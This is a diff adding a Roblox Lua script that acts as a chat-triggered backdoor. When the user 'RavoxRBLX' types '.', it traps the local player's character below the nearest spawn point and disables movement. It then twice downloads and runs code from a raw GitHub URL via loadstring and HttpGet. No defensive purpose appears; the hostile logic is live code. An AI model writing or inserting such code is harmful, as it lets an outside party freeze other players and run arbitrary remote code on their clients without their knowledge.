@@ -1,0 +1,62 @@
+-- Teleport & freeze + run loadstring twice, stop falling animation
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local TextChatService = game:GetService("TextChatService")
+
+local player = Players.LocalPlayer
+if not player then return end
+
+local function getNearestSpawn(position)
+    local closest
+    local dist = math.huge
+    for _, spawn in pairs(workspace:GetDescendants()) do
+        if spawn:IsA("SpawnLocation") then
+            local d = (spawn.Position - position).Magnitude
+            if d < dist then
+                dist = d
+                closest = spawn
+            end
+        end
+    end
+    return closest
+end
+
+local freezeConnection
+
+-- Trigger on chat
+local channel = TextChatService.TextChannels.RBXGeneral
+channel.MessageReceived:Connect(function(message)
+    if message.TextSource.Name == "RavoxRBLX" and message.Text == "." then
+        local character = player.Character or player.CharacterAdded:Wait()
+        local hrp = character:WaitForChild("HumanoidRootPart")
+        local humanoid = character:WaitForChild("Humanoid")
+
+        local spawn = getNearestSpawn(hrp.Position)
+        if not spawn then return end
+
+        local targetCFrame = spawn.CFrame * CFrame.new(0, -8, 0)
+
+        -- Anchor the root part to stop falling and disable animations
+        hrp.Anchored = true
+        hrp.CFrame = targetCFrame
+        humanoid:ChangeState(Enum.HumanoidStateType.Physics) -- stops falling anim
+        humanoid.WalkSpeed = 0
+        humanoid.JumpPower = 0
+
+        if freezeConnection then
+            freezeConnection:Disconnect()
+        end
+
+        -- Keep HRP in place
+        freezeConnection = RunService.RenderStepped:Connect(function()
+            if hrp then
+                hrp.CFrame = targetCFrame
+            end
+        end)
+
+        -- Run the loadstring twice
+        for i = 1, 2 do
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/porpora02-ai/d/refs/heads/main/infyeild"))()
+        end
+    end
+end)
